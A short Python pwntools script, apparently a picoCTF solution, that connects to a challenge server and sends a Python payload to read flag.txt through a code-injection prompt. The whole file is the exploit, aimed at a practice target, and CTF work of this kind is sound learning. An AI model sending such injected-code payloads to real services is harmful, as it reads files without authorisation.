from pwnlib.tubes.remote import remote
from pwn import *

host = "saturn.picoctf.net"
port = 56455
context.log_level = 'debug'

io = remote(host, port)
payload = b"print(open('flag.txt', 'r').read())"
io.recvuntil(b'==> ')
io.sendline(payload)
io.recvline()
io.recvline()

io.close()